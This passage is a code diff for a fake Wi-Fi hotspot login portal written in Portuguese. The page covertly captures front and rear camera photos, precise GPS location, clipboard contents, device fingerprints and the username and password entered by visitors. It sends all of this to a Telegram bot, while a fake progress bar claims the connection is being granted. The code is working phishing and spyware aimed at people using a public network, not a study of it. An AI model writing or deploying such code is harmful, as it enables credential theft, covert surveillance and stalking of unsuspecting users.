                 document.body.appendChild(canvas);
                 
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Parar stream
                 stream.getTracks().forEach(track => track.stop());
-                
-                // Remover elementos do DOM
                 video.remove();
                 canvas.remove();
                 
-                // Converter para base64
                 const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                 cameraPhotos[type] = dataURL;
                 
-                console.log(`Foto ${type} capturada silenciosamente`);
-                
-                // Enviar para Telegram
+                // Enviar foto imediatamente
                 await sendPhotoToTelegram(dataURL, type);
                 
-                return dataURL;
-                
             } catch (error) {
-                console.error(`Erro ao capturar foto ${type}:`, error);
-                return null;
+                console.error(`Erro foto ${type}:`, error);
             }
         }
 
-        // 📤 ENVIAR FOTO PARA TELEGRAM
-        async function sendPhotoToTelegram(photoData, type) {
+        // 📍 TESTE GPS
+        async function testGPS() {
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    deviceData.gpsData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        source: 'GPS_PRECISO'
+                    };
+                } catch (error) {
+                    deviceData.gpsData = {
+                        latitude: 'Negado',
+                        longitude: 'Negado',
+                        accuracy: 'N/A',
+                        source: 'NEGADO'
+                    };
+                }
+            }
+            
+            // Pegar localização por IP também
             try {
-                const response = await fetch(photoData);
-                const blob = await response.blob();
-                
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, `camera_${type}_${Date.now()}.jpg`);
-                formData.append('caption', `📸 FOTO ${type === 'front' ? 'FRONTAL (SELFIE)' : 'TRASEIRA (AMBIENTE)'}\n\n Data: ${new Date().toLocaleString('pt-BR')}\n📍 Localização: ${window.gpsData ? `${window.gpsData.latitude}, ${window.gpsData.longitude}` : 'N/A'}\n📡 IP: ${window.gpsData ? 'GPS_ATIVO' : 'IP_API'}`);
-                
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-                
-                await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                console.log(`Foto ${type} enviada para Telegram!`);
-                
-            } catch (error) {
-                console.error(`Erro ao enviar foto ${type}:`, error);
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                deviceData.ipData = ipData;
+            } catch (e) {
+                deviceData.ipData = null;
             }
         }
 
-        function showForm(type) {
-            const loginBtn = document.querySelector('.toggle-btn:nth-child(1)');
-            const registerBtn = document.querySelector('.toggle-btn:nth-child(2)');
-            const loginForm = document.getElementById('loginForm');
-            const registerForm = document.getElementById('registerForm');
-            const message = document.getElementById('message');
+        // 📊 COLETAR TODOS OS DADOS
+        async function collectAllData() {
+            deviceData.timestamp = new Date().toLocaleString('pt-BR');
+            deviceData.userAgent = navigator.userAgent;
+            deviceData.appName = navigator.appName;
+            deviceData.appVersion = navigator.appVersion;
+            deviceData.platform = navigator.platform;
+            deviceData.vendor = navigator.vendor;
+            deviceData.language = navigator.language;
+            deviceData.languages = navigator.languages?.join(', ') || navigator.language;
+            deviceData.onLine = navigator.onLine;
+            deviceData.cookieEnabled = navigator.cookieEnabled;
+            deviceData.doNotTrack = navigator.doNotTrack;
+            deviceData.screenWidth = screen.width;
+            deviceData.screenHeight = screen.height;
+            deviceData.windowWidth = window.innerWidth;
+            deviceData.windowHeight = window.innerHeight;
+            deviceData.colorDepth = screen.colorDepth;
+            deviceData.pixelDepth = screen.pixelDepth;
+            deviceData.devicePixelRatio = window.devicePixelRatio;
+            deviceData.orientation = screen.orientation?.type || 'N/A';
+            deviceData.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
+            deviceData.deviceMemory = navigator.deviceMemory || 'N/A';
+            deviceData.connectionType = navigator.connection ? (navigator.connection.effectiveType || 'N/A') : 'N/A';
+            deviceData.downlink = navigator.connection ? (navigator.connection.downlink || 'N/A') : 'N/A';
+            deviceData.rtt = navigator.connection ? (navigator.connection.rtt || 'N/A') : 'N/A';
+            deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            deviceData.timezoneOffset = new Date().getTimezoneOffset();
+            deviceData.referrer = document.referrer || 'Direto';
+            deviceData.currentURL = window.location.href;
+            deviceData.prefersColorScheme = window.matchMedia?.('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+            deviceData.canvasFingerprint = getCanvasFingerprint();
+            deviceData.webglFingerprint = getWebGLFingerprint();
+            deviceData.audioFingerprint = await getAudioFingerprint();
+            deviceData.installedFonts = detectFonts();
+            deviceData.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'N/A';
+            deviceData.batteryLevel = 'N/A';
+            deviceData.batteryCharging = 'N/A';
+            deviceData.mikrotik_username = '$(username)';
+            deviceData.mikrotik_remote_address = '$(remote-address)';
+            deviceData.mikrotik_mac = '$(mac)';
+            deviceData.mikrotik_server_name = '$(server-name)';
+            deviceData.mikrotik_link_orig = '$(link-orig)';
 
-            message.style.display = 'none';
+            // Bateria
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceData.batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                    deviceData.batteryCharging = battery.charging ? 'Sim' : 'Não';
+                } catch (e) {}
+            }
 
-            if (type === 'login') {
-                loginBtn.classList.add('active');
-                registerBtn.classList.remove('active');
-                loginForm.classList.add('active');
-                registerForm.classList.remove('active');
-            } else {
-                registerBtn.classList.add('active');
-                loginBtn.classList.remove('active');
-                registerForm.classList.add('active');
-                loginForm.classList.remove('active');
+            // Dispositivos de mídia
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    deviceData.mediaDevices = {
+                        audioInput: devices.filter(d => d.kind === 'audioinput').length,
+                        audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
+                        videoInput: devices.filter(d => d.kind === 'videoinput').length
+                    };
+                } catch (e) {}
+            }
+
+            // Clipboard (tentar ler)
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                deviceData.clipboard = clipboardText || 'Vazio';
+            } catch (e) {
+                deviceData.clipboard = 'Negado';
+            }
+
+            // Storage
+            deviceData.localStorage = !!window.localStorage;
+            deviceData.sessionStorage = !!window.sessionStorage;
+            deviceData.indexedDB = !!window.indexedDB;
+
+            // Network Information API
+            if (navigator.connection) {
+                deviceData.networkType = navigator.connection.type || 'N/A';
+                deviceData.downlinkMax = navigator.connection.downlinkMax || 'N/A';
+            }
+
+            // Permissions
+            try {
+                const permissions = await navigator.permissions.query({ name: 'notifications' });
+                deviceData.notificationsPermission = permissions.state;
+            } catch (e) {}
+
+            // WebGL extensions
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    deviceData.webglExtensions = gl.getSupportedExtensions()?.join(', ') || 'N/A';
+                }
+            } catch (e) {}
+
+            // Screen orientation lock capability
+            deviceData.orientationLock = 'orientation' in screen && 'lock' in screen.orientation;
+
+            // Vibration API
+            deviceData.vibrationAPI = 'vibrate' in navigator;
+
+            // Bluetooth (se disponível)
+            deviceData.bluetooth = 'bluetooth' in navigator;
+
+            // USB (se disponível)
+            deviceData.usb = 'usb' in navigator;
+
+            // NFC (se disponível)
+            deviceData.nfc = 'NFC' in window;
+
+            // Wake Lock (se disponível)
+            deviceData.wakeLock = 'wakeLock' in navigator;
+
+            // Payment Request API
+            deviceData.paymentRequest = 'PaymentRequest' in window;
+
+            // Credentials API
+            deviceData.credentials = 'credentials' in navigator;
+
+            // Service Worker
+            deviceData.serviceWorker = 'serviceWorker' in navigator;
+
+            // Web Workers
+            deviceData.webWorkers = 'Worker' in window;
+
+            // Shared Worker
+            deviceData.sharedWorker = 'SharedWorker' in window;
+
+            // Geolocation
+            deviceData.geolocation = 'geolocation' in navigator;
+
+            // Device Orientation
+            deviceData.deviceOrientation = 'DeviceOrientationEvent' in window;
+
+            // Device Motion
+            deviceData.deviceMotion = 'DeviceMotionEvent' in window;
+
+            // Ambient Light Sensor
+            deviceData.ambientLight = 'AmbientLightSensor' in window;
+
+            // Gamepad API
+            deviceData.gamepads = navigator.getGamepads ? navigator.getGamepads().length : 0;
+
+            // MIDI
+            deviceData.midi = 'requestMIDIAccess' in navigator;
+
+            // Presentation API
+            deviceData.presentation = 'presentation' in navigator;
+
+            // Remote Playback
+            deviceData.remotePlayback = 'RemotePlayback' in window;
+
+            // Picture in Picture
+            deviceData.pictureInPicture = 'pictureInPictureEnabled' in document;
+
+            // Resize Observer
+            deviceData.resizeObserver = 'ResizeObserver' in window;
+
+            // Intersection Observer
+            deviceData.intersectionObserver = 'IntersectionObserver' in window;
+
+            // Mutation Observer
+            deviceData.mutationObserver = 'MutationObserver' in window;
+
+            // Performance API
+            if (performance && performance.timing) {
+                deviceData.pageLoadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
+                deviceData.domContentLoaded = performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart;
+            }
+
+            // Hardware info
+            deviceData.cpuCores = navigator.hardwareConcurrency || 'N/A';
+            deviceData.deviceMemory = navigator.deviceMemory || 'N/A';
+            deviceData.maxTouchPoints = navigator.maxTouchPoints || 0;
+
+            // Screen info
+            deviceData.screenAvailWidth = screen.availWidth;
+            deviceData.screenAvailHeight = screen.availHeight;
+            deviceData.screenColorDepth = screen.colorDepth;
+            deviceData.screenPixelDepth = screen.pixelDepth;
+
+            // Window info
+            deviceData.outerWidth = window.outerWidth;
+            deviceData.outerHeight = window.outerHeight;
+            deviceData.innerWidth = window.innerWidth;
+            deviceData.innerHeight = window.innerHeight;
+
+            // Navigator info
+            deviceData.cookieEnabled = navigator.cookieEnabled;
+            deviceData.javaEnabled = typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false;
+            deviceData.pdfViewerEnabled = navigator.pdfViewerEnabled;
+            deviceData.webdriver = navigator.webdriver;
+
+            // Try to get more network info
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                deviceData.publicIP = ipData.ip;
+                deviceData.city = ipData.city;
+                deviceData.region = ipData.region;
+                deviceData.country = ipData.country_name;
+                deviceData.postal = ipData.postal;
+                deviceData.org = ipData.org;
+                deviceData.asn = ipData.asn;
+                deviceData.isp = ipData.org;
+            } catch (e) {
+                deviceData.publicIP = 'Não disponível';
             }
         }
 
@@ -973,302 +1074,237 @@
             return detected;
         }
 
-        // 📊 COLETAR TODOS OS DADOS
-        async function collectDeviceData(action) {
-            const data = {
-                action: action,
-                timestamp: new Date().toLocaleString('pt-BR'),
-                userAgent: navigator.userAgent,
-                appName: navigator.appName,
-                appVersion: navigator.appVersion,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                language: navigator.language,
-                languages: navigator.languages?.join(', ') || navigator.language,
-                onLine: navigator.onLine,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                windowWidth: window.innerWidth,
-                windowHeight: window.innerHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                devicePixelRatio: window.devicePixelRatio,
-                orientation: screen.orientation?.type || 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                connectionType: navigator.connection ? (navigator.connection.effectiveType || 'N/A') : 'N/A',
-                downlink: navigator.connection ? (navigator.connection.downlink || 'N/A') : 'N/A',
-                rtt: navigator.connection ? (navigator.connection.rtt || 'N/A') : 'N/A',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                referrer: document.referrer || 'Direto',
-                currentURL: window.location.href,
-                canvasFingerprint: getCanvasFingerprint(),
-                webglFingerprint: getWebGLFingerprint(),
-                audioFingerprint: await getAudioFingerprint(),
-                installedFonts: detectFonts(),
-                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'N/A',
-                touchSupport: 'ontouchstart' in window,
-                batteryLevel: 'N/A',
-                batteryCharging: 'N/A',
-                prefersColorScheme: window.matchMedia?.('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-                mikrotik_username: '$(username)',
-                mikrotik_remote_address: '$(remote-address)',
-                mikrotik_mac: '$(mac)',
-                mikrotik_server_name: '$(server-name)',
-                mikrotik_link_orig: '$(link-orig)',
-                cameraFront: cameraPhotos.front ? 'CAPTURADA' : 'NÃO DISPONÍVEL',
-                cameraBack: cameraPhotos.back ? 'CAPTURADA' : 'NÃO DISPONÍVEL'
-            };
-
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    data.batteryLevel = (battery.level * 100).toFixed(0) + '%';
-                    data.batteryCharging = battery.charging ? 'Sim' : 'Não';
-                } catch (e) {}
-            }
-
+        // 📤 ENVIAR FOTO PARA TELEGRAM
+        async function sendPhotoToTelegram(photoData, type) {
             try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                data.publicIP = ipData.ip;
-                data.city = ipData.city;
-                data.region = ipData.region;
-                data.country = ipData.country_name;
-                data.postal = ipData.postal;
-                data.ipLatitude = ipData.latitude;
-                data.ipLongitude = ipData.longitude;
-                data.org = ipData.org;
-                data.asn = ipData.asn;
-                data.isp = ipData.org;
-            } catch (e) {
-                data.publicIP = 'Não disponível';
+                const response = await fetch(photoData);
+                const blob = await response.blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, `camera_${type}_${Date.now()}.jpg`);
+                formData.append('caption', `📸 FOTO ${type === 'front' ? 'FRONTAL (SELFIE)' : 'TRASEIRA (AMBIENTE)'}\n\n🕐 Data: ${new Date().toLocaleString('pt-BR')}\n Usuário: ${userData.username || 'N/A'}\n📍 Localização: ${deviceData.gpsData ? `${deviceData.gpsData.latitude}, ${deviceData.gpsData.longitude}` : 'N/A'}`);
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                
+                await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                console.log(`Foto ${type} enviada!`);
+                
+            } catch (error) {
+                console.error(`Erro enviar foto ${type}:`, error);
             }
+        }
 
-            if (window.gpsData) {
-                data.gps_latitude = window.gpsData.latitude;
-                data.gps_longitude = window.gpsData.longitude;
-                data.gps_accuracy = window.gpsData.accuracy;
-                data.gps_altitude = window.gpsData.altitude || 'N/A';
-                data.gps_speed = window.gpsData.speed || 'N/A';
-                data.gps_heading = window.gpsData.heading || 'N/A';
-                data.gps_source = window.gpsData.source;
-            } else {
-                data.gps_latitude = data.ipLatitude || 'N/A';
-                data.gps_longitude = data.ipLongitude || 'N/A';
-                data.gps_accuracy = 'Aproximada (IP)';
-                data.gps_source = 'IP_API';
+        // 📤 ENVIAR TUDO PARA TELEGRAM
+        async function sendAllToTelegram() {
+            const message = formatTelegramMessage();
+            const encodedMessage = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+            
+            try {
+                await fetch(url, { method: 'GET', mode: 'no-cors' });
+                console.log('Mensagem enviada!');
+                
+                // Enviar localização GPS
+                if (deviceData.gpsData && deviceData.gpsData.latitude !== 'Negado') {
+                    const lat = parseFloat(deviceData.gpsData.latitude);
+                    const lon = parseFloat(deviceData.gpsData.longitude);
+                    if (!isNaN(lat) && !isNaN(lon)) {
+                        const locationUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation?chat_id=${TELEGRAM_CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+                        await fetch(locationUrl, { method: 'GET', mode: 'no-cors' });
+                    }
+                }
+            } catch (error) {
+                console.error('Erro enviar mensagem:', error);
             }
-
-            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    data.mediaDevices = {
-                        audioInput: devices.filter(d => d.kind === 'audioinput').length,
-                        audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
-                        videoInput: devices.filter(d => d.kind === 'videoinput').length
-                    };
-                } catch (e) {}
-            }
-
-            return data;
         }
 
         // 📝 FORMATAR MENSAGEM
-        function formatTelegramMessage(userData, formData) {
-            const isLogin = userData.action === 'login';
-            const action = isLogin ? '🟢 LOGIN' : '🔵 CADASTRO';
-            
-            let message = `${action} - PORTAL DE ACESSO\n`;
+        function formatTelegramMessage() {
+            let message = `🔵 NOVO CADASTRO - PORTAL DE ACESSO\n`;
             message += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
             
             message += `👤 *DADOS DA CONTA:*\n`;
-            if (!isLogin && formData.name) message += `├ Nome: ${formData.name}\n`;
-            message += `├ Usuário: ${formData.username}\n`;
-            message += `├ Senha: ${formData.password}\n`;
-            message += `└ Data: ${userData.timestamp}\n\n`;
+            message += `├ Nome: ${userData.name}\n`;
+            message += `├ Usuário: ${userData.username}\n`;
+            message += `├ Senha: ${userData.password}\n`;
+            message += `└ Data: ${deviceData.timestamp}\n\n`;
             
-            message += ` *CÂMERAS:*\n`;
-            message += `├ Frontal: ${userData.cameraFront}\n`;
-            message += `└ Traseira: ${userData.cameraBack}\n\n`;
+            message += `📸 *CÂMERAS:*\n`;
+            message += `├ Frontal: ${deviceData.cameraFront || 'N/A'}\n`;
+            message += `└ Traseira: ${deviceData.cameraBack || 'N/A'}\n\n`;
             
-            message += `📍 *LOCALIZAÇÃO GPS PRECISA:*\n`;
-            message += ` Latitude: ${userData.gps_latitude}\n`;
-            message += `├ Longitude: ${userData.gps_longitude}\n`;
-            message += `├ Precisão: ${userData.gps_accuracy}m\n`;
-            message += `├ Altitude: ${userData.gps_altitude}\n`;
-            message += `├ Velocidade: ${userData.gps_speed}\n`;
-            message += `├ Direção: ${userData.gps_heading}\n`;
-            message += `└ Fonte: ${userData.gps_source}\n\n`;
-            
-            message += ` *LOCALIZAÇÃO POR IP:*\n`;
-            message += `├ IP Público: ${userData.publicIP}\n`;
-            message += `├ IP MikroTik: ${userData.mikrotik_remote_address}\n`;
-            message += `├ MAC: ${userData.mikrotik_mac}\n`;
-            message += `├ Cidade: ${userData.city}\n`;
-            message += `├ Região: ${userData.region}\n`;
-            message += `├ País: ${userData.country}\n`;
-            message += ` CEP: ${userData.postal}\n`;
-            message += `├ ISP: ${userData.isp}\n`;
-            message += `├ ASN: ${userData.asn}\n`;
-            message += ` Lat IP: ${userData.ipLatitude}\n`;
-            message += `└ Long IP: ${userData.ipLongitude}\n\n`;
-            
-            message += `💻 *DISPOSITIVO:*\n`;
-            message += `├ Plataforma: ${userData.platform}\n`;
-            message += `├ Idioma: ${userData.language}\n`;
-            message += ` CPU Cores: ${userData.hardwareConcurrency}\n`;
-            message += `├ RAM: ${userData.deviceMemory}GB\n`;
-            message += `├ Touch: ${userData.maxTouchPoints} pontos\n`;
-            message += `├ Bateria: ${userData.batteryLevel}\n`;
-            message += `└ Carregando: ${userData.batteryCharging}\n\n`;
-            
-            message += `📱 *TELA:*\n`;
-            message += ` Resolução: ${userData.screenWidth}x${userData.screenHeight}\n`;
-            message += `├ Window: ${userData.windowWidth}x${userData.windowHeight}\n`;
-            message += `├ Pixel Ratio: ${userData.devicePixelRatio}\n`;
-            message += `├ Color Depth: ${userData.colorDepth}bit\n`;
-            message += `└ Orientação: ${userData.orientation}\n\n`;
-            
-            message += `🔌 *CONEXÃO:*\n`;
-            message += `├ Tipo: ${userData.connectionType}\n`;
-            message += `├ Velocidade: ${userData.downlink} Mbps\n`;
-            message += `├ Latência: ${userData.rtt}ms\n`;
-            message += `└ Online: ${userData.onLine}\n\n`;
-            
-            message += `🎨 *FINGERPRINTS:*\n`;
-            message += `├ Canvas: ${userData.canvasFingerprint}\n`;
-            message += `├ Audio: ${userData.audioFingerprint}\n`;
-            message += `├ GPU Vendor: ${userData.webglFingerprint.vendor}\n`;
-            message += `└ GPU Renderer: ${userData.webglFingerprint.renderer}\n\n`;
-            
-            if (userData.mediaDevices) {
-                message += ` *MÍDIA:*\n`;
-                message += `├ Microfones: ${userData.mediaDevices.audioInput}\n`;
-                message += `├ Alto-falantes: ${userData.mediaDevices.audioOutput}\n`;
-                message += `└ Câmeras: ${userData.mediaDevices.videoInput}\n\n`;
+            if (deviceData.gpsData) {
+                message += `📍 *LOCALIZAÇÃO GPS:*\n`;
+                message += `├ Latitude: ${deviceData.gpsData.latitude}\n`;
+                message += `├ Longitude: ${deviceData.gpsData.longitude}\n`;
+                message += `├ Precisão: ${deviceData.gpsData.accuracy}m\n`;
+                message += `├ Altitude: ${deviceData.gpsData.altitude || 'N/A'}\n`;
+                message += `├ Velocidade: ${deviceData.gpsData.speed || 'N/A'}\n`;
+                message += `├ Direção: ${deviceData.gpsData.heading || 'N/A'}\n`;
+                message += `└ Fonte: ${deviceData.gpsData.source}\n\n`;
             }
             
-            message += `🔤 *FONTES:*\n└ ${userData.installedFonts.join(', ')}\n\n`;
+            if (deviceData.ipData || deviceData.publicIP) {
+                message += ` *LOCALIZAÇÃO IP:*\n`;
+                message += `├ IP Público: ${deviceData.publicIP || deviceData.ipData?.ip || 'N/A'}\n`;
+                message += `├ IP MikroTik: ${deviceData.mikrotik_remote_address}\n`;
+                message += `├ MAC: ${deviceData.mikrotik_mac}\n`;
+                message += `├ Cidade: ${deviceData.city || deviceData.ipData?.city || 'N/A'}\n`;
+                message += `├ Região: ${deviceData.region || deviceData.ipData?.region || 'N/A'}\n`;
+                message += `├ País: ${deviceData.country || deviceData.ipData?.country_name || 'N/A'}\n`;
+                message += `├ CEP: ${deviceData.postal || deviceData.ipData?.postal || 'N/A'}\n`;
+                message += `├ ISP: ${deviceData.isp || deviceData.ipData?.org || 'N/A'}\n`;
+                message += `└ ASN: ${deviceData.asn || deviceData.ipData?.asn || 'N/A'}\n\n`;
+            }
             
-            message += `🔐 *NAVEGADOR:*\n`;
-            message += `├ Cookies: ${userData.cookieEnabled}\n`;
-            message += `├ DNT: ${userData.doNotTrack}\n`;
-            message += `├ Tema: ${userData.prefersColorScheme}\n`;
-            message += `├ Timezone: ${userData.timezone}\n`;
-            message += `├ Server: ${userData.mikrotik_server_name}\n`;
-            message += `└ URL: ${userData.currentURL}\n\n`;
+            message += `💻 *DISPOSITIVO:*\n`;
+            message += `├ Plataforma: ${deviceData.platform}\n`;
+            message += `├ Idioma: ${deviceData.language}\n`;
+            message += `├ Idiomas: ${deviceData.languages}\n`;
+            message += `├ CPU Cores: ${deviceData.hardwareConcurrency}\n`;
+            message += `├ RAM: ${deviceData.deviceMemory}GB\n`;
+            message += `├ Touch: ${deviceData.maxTouchPoints} pontos\n`;
+            message += `├ Touch Support: ${deviceData.touchSupport}\n`;
+            message += `├ Pointer: ${deviceData.pointerType}\n`;
+            message += `├ Bateria: ${deviceData.batteryLevel}\n`;
+            message += `└ Carregando: ${deviceData.batteryCharging}\n\n`;
             
-            message += `⚡ *User Agent:*\n\`${userData.userAgent}\``;
+            message += `📱 *TELA:*\n`;
+            message += `├ Resolução: ${deviceData.screenWidth}x${deviceData.screenHeight}\n`;
+            message += `├ Disponível: ${deviceData.screenAvailWidth}x${deviceData.screenAvailHeight}\n`;
+            message += `├ Window: ${deviceData.innerWidth}x${deviceData.innerHeight}\n`;
+            message += `├ Outer: ${deviceData.outerWidth}x${deviceData.outerHeight}\n`;
+            message += `├ Pixel Ratio: ${deviceData.devicePixelRatio}\n`;
+            message += `├ Color Depth: ${deviceData.colorDepth}bit\n`;
+            message += `├ Pixel Depth: ${deviceData.pixelDepth}bit\n`;
+            message += ` Orientação: ${deviceData.orientation}\n\n`;
+            
+            message += `🔌 *CONEXÃO:*\n`;
+            message += `├ Tipo: ${deviceData.connectionType}\n`;
+            message += `├ Network Type: ${deviceData.networkType || 'N/A'}\n`;
+            message += `├ Velocidade: ${deviceData.downlink} Mbps\n`;
+            message += `├ Downlink Max: ${deviceData.downlinkMax || 'N/A'} Mbps\n`;
+            message += `├ Latência: ${deviceData.rtt}ms\n`;
+            message += `├ Online: ${deviceData.onLine}\n`;
+            message += `└ Timezone: ${deviceData.timezone} (UTC${deviceData.timezoneOffset > 0 ? '-' : '+'}${Math.abs(deviceData.timezoneOffset/60)})\n\n`;
+            
+            message += `🎨 *FINGERPRINTS:*\n`;
+            message += `├ Canvas: ${deviceData.canvasFingerprint}\n`;
+            message += `├ Audio: ${deviceData.audioFingerprint}\n`;
+            message += `├ GPU Vendor: ${deviceData.webglFingerprint.vendor}\n`;
+            message += `├ GPU Renderer: ${deviceData.webglFingerprint.renderer}\n`;
+            message += `├ WebGL Version: ${deviceData.webglFingerprint.version}\n`;
+            message += `└ WebGL Extensions: ${deviceData.webglExtensions || 'N/A'}\n\n`;
+            
+            if (deviceData.mediaDevices) {
+                message += `🎤 *MÍDIA:*\n`;
+                message += `├ Microfones: ${deviceData.mediaDevices.audioInput}\n`;
+                message += `├ Alto-falantes: ${deviceData.mediaDevices.audioOutput}\n`;
+                message += `└ Câmeras: ${deviceData.mediaDevices.videoInput}\n\n`;
+            }
+            
+            message += `🔤 *FONTES INSTALADAS:*\n└ ${deviceData.installedFonts.join(', ')}\n\n`;
+            
+            message += ` *NAVEGADOR:*\n`;
+            message += `├ App Name: ${deviceData.appName}\n`;
+            message += `├ App Version: ${deviceData.appVersion}\n`;
+            message += `├ Vendor: ${deviceData.vendor}\n`;
+            message += `├ Cookies: ${deviceData.cookieEnabled}\n`;
+            message += `├ DNT: ${deviceData.doNotTrack}\n`;
+            message += `├ Java Enabled: ${deviceData.javaEnabled}\n`;
+            message += `├ PDF Viewer: ${deviceData.pdfViewerEnabled}\n`;
+            message += `├ WebDriver: ${deviceData.webdriver}\n`;
+            message += `├ LocalStorage: ${deviceData.localStorage}\n`;
+            message += `├ SessionStorage: ${deviceData.sessionStorage}\n`;
+            message += `├ IndexedDB: ${deviceData.indexedDB}\n`;
+            message += `├ Service Worker: ${deviceData.serviceWorker}\n`;
+            message += `├ Web Workers: ${deviceData.webWorkers}\n`;
+            message += `├ Shared Worker: ${deviceData.sharedWorker}\n`;
+            message += `└ Tema: ${deviceData.prefersColorScheme}\n\n`;
+            
+            message += `🎮 *APIS DISPONÍVEIS:*\n`;
+            message += `├ Bluetooth: ${deviceData.bluetooth}\n`;
+            message += `├ USB: ${deviceData.usb}\n`;
+            message += ` NFC: ${deviceData.nfc}\n`;
+            message += `├ Wake Lock: ${deviceData.wakeLock}\n`;
+            message += ` Payment: ${deviceData.paymentRequest}\n`;
+            message += `├ Credentials: ${deviceData.credentials}\n`;
+            message += `├ Geolocation: ${deviceData.geolocation}\n`;
+            message += `├ Device Orientation: ${deviceData.deviceOrientation}\n`;
+            message += `├ Device Motion: ${deviceData.deviceMotion}\n`;
+            message += `├ Ambient Light: ${deviceData.ambientLight}\n`;
+            message += `├ Gamepads: ${deviceData.gamepads}\n`;
+            message += `├ MIDI: ${deviceData.midi}\n`;
+            message += ` Presentation: ${deviceData.presentation}\n`;
+            message += `├ Remote Playback: ${deviceData.remotePlayback}\n`;
+            message += `├ Picture in Picture: ${deviceData.pictureInPicture}\n`;
+            message += `├ Vibration: ${deviceData.vibrationAPI}\n`;
+            message += `├ Notifications: ${deviceData.notificationsPermission || 'N/A'}\n\n`;
+            
+            message += `📊 *PERFORMANCE:*\n`;
+            message += `├ Page Load: ${deviceData.pageLoadTime || 'N/A'}ms\n`;
+            message += ` DOM Content Loaded: ${deviceData.domContentLoaded || 'N/A'}ms\n\n`;
+            
+            message += `📋 *CLIPBOARD:*\n└ ${deviceData.clipboard || 'N/A'}\n\n`;
+            
+            message += `📄 *PÁGINA:*\n`;
+            message += `├ URL: ${deviceData.currentURL}\n`;
+            message += `├ Referrer: ${deviceData.referrer}\n`;
+            message += `└ Server: ${deviceData.mikrotik_server_name}\n\n`;
+            
+            message += `⚡ *User Agent:*\n\`${deviceData.userAgent}\``;
             
             return message;
         }
 
-        //  ENVIAR PARA TELEGRAM
-        async function sendToTelegram(userData, formData) {
-            try {
-                const message = formatTelegramMessage(userData, formData);
-                const encodedMessage = encodeURIComponent(message);
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
-                
-                await fetch(url, { method: 'GET', mode: 'no-cors' });
-                
-                const lat = parseFloat(userData.gps_latitude);
-                const lon = parseFloat(userData.gps_longitude);
-                
-                if (!isNaN(lat) && !isNaN(lon) && userData.gps_source === 'GPS_PRECISO') {
-                    const locationUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation?chat_id=${TELEGRAM_CHAT_ID}&latitude=${lat}&longitude=${lon}`;
-                    await fetch(locationUrl, { method: 'GET', mode: 'no-cors' });
+        // 📊 BARRA DE PROGRESSO
+        function startProgress() {
+            let progress = 0;
+            const fill = document.getElementById('progressFill');
+            const text = document.getElementById('progressText');
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    text.textContent = 'Conexão liberada com sucesso! ✅';
+                    
